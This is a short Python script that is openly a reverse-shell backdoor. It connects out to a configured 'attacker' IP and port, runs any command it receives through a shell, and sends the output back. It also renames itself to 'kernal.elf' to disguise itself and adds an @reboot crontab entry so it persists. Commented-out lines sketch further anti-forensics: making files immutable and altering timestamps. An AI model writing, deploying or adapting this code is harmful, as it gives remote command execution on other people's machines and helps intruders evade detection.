import os
import socket
import subprocess
import time
import base64
import zlib

# Attacker's IP and port (your machine's IP)
attacker_ip = '192.168.64.1'  # Replace with the IP of your machine
attacker_port = 80            # Replace with the port you want to use

def connect_back_to_attacker():
    try:
        # Create a socket to connect to the attacker's machine
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((attacker_ip, attacker_port))  # Initiates connection to attacker
        print(f"Connected to attacker at {attacker_ip}:{attacker_port}")
        
        while True:
            # Receive commands from the attacker
            command = s.recv(1024).decode()

            if command.lower() == 'quit':
                s.close()  # Close connection and exit loop
                break

            # Execute the command received
            output = subprocess.run(command, shell=True, capture_output=True)

            # Send the output back to the attacker
            s.send(output.stdout)

    except Exception as e:
        print(f"Failed to connect to attacker: {e}")
        time.sleep(5)  # Retry every 5 seconds in case of failure

# Anti-forensics
# Rename the current process
script_path = os.path.abspath(__file__)
os.system(f'mv "{script_path}" kernal.elf')

# Hide files
# os.system('chattr +i *')

# # Modify timestamps
# for file in os.listdir():
#     os.utime(file, (time.time(), time.time()))

# Persistence
# Detect the OS
if os.name == 'posix':  # Linux
    os_name = 'linux'
    os.system('(crontab -l 2>/dev/null; echo "@reboot kernal.elf") | crontab -')

# Attempt to connect back to the attacker's machine
connect_back_to_attacker()
